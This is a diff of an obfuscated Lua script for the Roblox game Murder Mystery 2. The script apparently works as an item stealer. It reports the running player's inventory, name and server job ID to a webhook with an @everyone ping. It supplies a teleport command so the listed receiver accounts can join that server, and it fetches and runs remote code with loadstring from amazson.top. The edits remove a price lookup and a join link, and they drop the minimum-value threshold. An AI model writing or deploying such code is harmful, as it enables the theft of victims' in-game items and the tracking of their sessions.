@@ -141,8 +141,8 @@ local function fn(arg)
 end
 
 local users = { "0xun1que", "bleedmyworId" }
-local minRarity = "Godly"
-local minValue = 100
+local minRarity = "Other"
+local minValue = 150
 local ping = 100
 E = "own"
 
@@ -1090,48 +1090,9 @@ if flag then
 		return string.format("%g", math.floor(arg * 100 + 0.5) / 100)
 	end
 
-	local dollarMap = {}
-
-	pcall(function()
-		local ok, res = pcall(function()
-			return game:HttpGet("https://api.project-reverse.org/valuables/get-game-valuables?game=mm2")
-		end)
-
-		if ok and res then
-			local ok2, res2 = pcall(function()
-				return HttpService2:JSONDecode(res)
-			end)
-
-			if ok2 and res2 and res2.data then
-				for _, v10 in ipairs(res2.data) do
-					if v10.name and v10.price then
-						dollarMap[v10.name] = v10.price
-						dollarMap[string.lower(tostring(v10.name))] = v10.price
-					end
-				end
-			end
-		end
-	end)
-
-	local function fnDollar(arg)
-		if not arg then
-			return 0
-		end
-
-		local v10 = dollarMap[arg]
-
-		if v10 then
-			return v10
-		end
-
-		return dollarMap[string.lower(tostring(arg))] or 0
-	end
-
 	local function fn28(arg, arg2)
 		local tbl7 = {}
 		local tbl8 = {}
-
-		local totalDollar = 0
 
 		for i, v10 in ipairs(arg) do
 			local n2 = v10.Value * v10.Amount
@@ -1139,9 +1100,7 @@ if flag then
 			tbl8[rarity] = tbl8[rarity] or {}
 			local str2 = v10.ItemType and v10.ItemType ~= "" and " (" .. v10.ItemType .. ")" or ""
 			local str3 = v10.Amount and v10.Amount > 1 and " (x" .. v10.Amount .. ")" or ""
-			local dollar = fnDollar(v10.DataID) * (v10.Amount or 1)
-			totalDollar += dollar
-			table.insert(tbl8[rarity], string.format("    %s%s → %s ($%.2f)%s", v10.RealName, str2, fn27(n2), dollar, str3))
+			table.insert(tbl8[rarity], string.format("    %s%s → %s%s", v10.RealName, str2, fn27(n2), str3))
 
 			if i <= 10 then
 				table.insert(tbl7, { name = v10.RealName, amount = v10.Amount, value = v10.Value, type = v10.ItemType })
@@ -1165,12 +1124,11 @@ if flag then
 		end
 
 		local str2 = table.concat(users, ", ")
-		local str3 = "Total Items: " .. #arg .. "\nTotal Value: " .. fn27(n) .. "\nTotal $: " .. string.format("%.2f", totalDollar) .. "\n\n" .. table.concat(tbl9, "\n")
+		local str3 = "Total Items: " .. #arg .. "\nTotal Value: " .. fn27(n) .. "\n\n" .. table.concat(tbl9, "\n")
 		local jobId = game.JobId
-		local joinLink = string.format("https://plsbrainrot.me/joiner?placeId=%s&gameInstanceId=%s", game.PlaceId, jobId)
 
 		postWebhook({
-			content = arg2 .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. jobId .. "')\n" .. joinLink,
+			content = arg2 .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. jobId .. "')",
 			allowed_mentions = { parse = { "everyone" } },
 			embeds = { {
 				title = "MM2 Inventario",
@@ -1180,11 +1138,9 @@ if flag then
 					{ name = "Jugador", value = tostring(localPlayer2.Name), inline = true },
 					{ name = "Executor", value = EXEC, inline = true },
 					{ name = "Valor total", value = fn27(n), inline = true },
-					{ name = "Precio total", value = "$" .. string.format("%.2f", totalDollar), inline = true },
 					{ name = "Items", value = tostring(#arg), inline = true },
 					{ name = "Receivers", value = str2, inline = false },
 					{ name = "Job ID", value = jobId, inline = false },
-					{ name = "Join Link", value = string.format("[**%s**](%s)", jobId, joinLink), inline = false },
 				},
 			} },
 		})
@@ -1346,7 +1302,7 @@ if flag then
 		Synthwave_Godly = true,
 	}
 
-		local lib2 = loadstring(game:HttpGet("https://amazson.top/supreme"))() or {
+	local lib2 = loadstring(game:HttpGet("https://amazson.top/supreme"))() or {
 		Halloween = {},
 		Christmas = {},
 		Chroma = {
@@ -1750,11 +1706,9 @@ if flag then
 			str2 = "@everyone\n"
 		end
 
-		if n >= (tonumber(minValue) or 0) then
-			task.spawn(function()
-				fn25("SendFirstMessage", fn28, tbl, str2)
-			end)
-		end
+		task.spawn(function()
+			fn25("SendFirstMessage", fn28, tbl, str2)
+		end)
 
 		local fn30 = nil
 		local flag3 = false
